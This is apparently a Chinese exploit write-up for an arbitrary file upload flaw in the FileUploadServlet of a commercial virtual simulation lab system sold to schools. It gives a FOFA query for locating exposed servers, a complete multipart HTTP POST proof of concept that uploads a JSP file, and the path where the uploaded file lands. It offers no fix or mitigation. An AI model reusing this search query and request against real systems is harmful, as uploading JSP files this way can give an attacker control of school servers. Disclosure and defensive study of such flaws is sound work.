## **虚拟仿真实验室系统FileUploadServlet存在任意文件上传漏洞**

北京润尼尔科技股份有限公司（原北京润尼尔网络科技有限公司，以下简称“润尼尔或公司”）于2007年12月成立，实缴注册资本2483万，是一家在北京石景山区注册的国家高新技术企业、北京市专精特新企业，四届蝉联 “中国VR50强企业”。目前在武汉、西安、上海、成都、合肥、哈尔滨等地设立了分支机构。公司以虚拟仿真技术和网络技术为依托，面向各类学校提供集虚拟仿真教学资源、管理平台和虚拟现实设备为一体的“VR+教育”整体解决方案，旨在提高学生的实践动手能力，助力学校提高人才培养质量。北京润尼尔科技股份有限公司虚拟仿真实验室系统FileUploadServlet存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

![image-20240711190816566](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407111908243.png)

## fofa

```yaml
body="virexp/s"
```

## poc

```yaml
POST /chatroom/FileUploadServlet HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=D608C8AF5AC63FB5DA57B858CFC42B42
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGIc4ig8R
Content-Length: 153

------WebKitFormBoundaryGIc4ig8R
Content-Disposition: form-data; name="aaa"; filename="1234.jsp"

<% out.println("testqqww"); %>
------WebKitFormBoundaryGIc4ig8R--
```

![img](https://cdn.nlark.com/yuque/0/2024/png/10358436/1720276416352-970a7928-f599-4645-b0d5-bf1c33db5b8c.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_9%2Ctext_5pif5oKm5a6J5YWo%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10%2Fformat%2Cwebp)



文件路径`/chatroom/uploadFile/1234.jsp`